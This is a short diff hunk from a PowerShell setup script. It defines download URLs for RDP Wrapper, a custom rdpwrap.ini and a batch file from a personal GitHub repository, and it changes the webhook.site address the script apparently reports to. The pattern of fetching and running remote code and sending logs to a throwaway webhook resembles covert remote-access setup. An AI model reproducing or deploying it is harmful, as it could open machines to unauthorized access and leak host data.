@@ -82,7 +82,7 @@ $rdpConf     = Join-Path $installPath "RDPConf.exe"
 $zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
 $customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs/heads/master/rdpwrap.ini"
 $srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
-$webhookUrl   = "https://webhook.site/2240d221-660a-4298-b8fa-d80e319ed001"
+$webhookUrl   = "https://webhook.site/b070bb97-926a-4b24-95f9-cf031e50be3e"
 
 # ============================================================
 # Webhook Function (Sends JSON properly to prevent blank logs)
